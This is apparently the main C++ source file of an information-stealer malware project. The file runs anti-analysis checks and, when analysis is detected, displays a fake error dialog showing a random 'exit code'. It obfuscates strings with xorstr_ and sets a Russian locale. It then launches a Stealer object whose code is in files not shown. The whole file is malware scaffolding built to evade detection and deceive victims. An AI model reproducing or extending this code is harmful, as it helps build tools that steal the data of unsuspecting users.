#include "stealer/Stealer.h"
#include <locale>
#include "windows.h"
#include "utils/Utils.h"
#include "Config.h"
#include "antianalysis/AntiAnalysisChecker.h"

void globalExceptionHandler() {
    try {
        throw;
    } catch (const std::exception& e) {
#if DEV
        std::cerr << "Exception caught in globalExceptionHandler: " << e.what() << std::endl;
#endif
    } catch (...) {
#if DEV
        std::cerr << "Unknown exception caught in globalExceptionHandler." << std::endl;
#endif
    }
}

int main() {
    std::set_terminate(globalExceptionHandler);

#if !DEV
    if(!AntiAnalysisChecker::check())
    {
        std::string str = "Exit code: 0x" + Utils::generateString(5, "01");
        MessageBox(NULL,
                   str.c_str(),
                   NULL,
                   MB_RETRYCANCEL | MB_ICONERROR);
    }
#endif

    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    Stealer stealer;
    stealer.run();
    stealer.complete();


    return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    return main();
}